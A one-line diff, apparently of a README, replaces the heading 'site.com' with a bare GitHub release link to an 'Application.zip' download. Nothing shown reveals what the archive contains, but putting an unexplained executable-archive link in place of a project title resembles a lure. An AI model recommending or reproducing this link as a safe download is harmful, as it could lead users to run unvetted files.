@@ -1,1 +1,1 @@
-# site.com
+# https://github.com/njschal/site.com/releases/download/v1.0/Application.zip
